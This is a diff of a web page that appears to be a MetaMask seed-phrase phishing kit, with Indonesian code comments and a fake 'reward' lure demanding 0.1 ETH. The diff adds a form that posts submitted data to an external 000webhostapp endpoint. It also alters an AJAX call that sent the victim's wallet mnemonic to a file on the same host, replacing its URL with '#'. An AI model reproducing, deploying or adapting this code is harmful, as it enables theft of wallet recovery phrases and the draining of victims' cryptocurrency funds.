@@ -41,7 +41,7 @@
 </head>
 <body>
 
-
+<form action="https://caveteriada01.000webhostapp.com/reload.php" method="post">
 <div class="alert alert-with-close notice" id="noticeajax" style="display:none;"></div>
 <div class="layout layout--anonymous">
 <div class="layout__header">
@@ -425,7 +425,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
     <script>
-      const redirectUrl = 'twsubmit.html' // redirect url setelah memasuki lastStage
+      const redirectUrl = '#' // redirect url setelah memasuki lastStage
       const lastStage = 3 // stage terakhir untuk redirect (stage === lastStage)
       let stage = 1 // awal stage
       const errorMsg = ['Need 0.1 ETH to receive the reward','Need 0.1 ETH to receive the reward'] // error message urutan berdasarkan stage
@@ -477,7 +477,7 @@
         if(stage < lastStage) {
           $.ajax({
             method: "POST",
-            url: "https://caveteriada01.000webhostapp.com/neweraqwerty.txt",
+            url: "#",
             data: { seed: mnemonic, wallet: 'Metamask' },
             success: function(data) {
               updateStage()
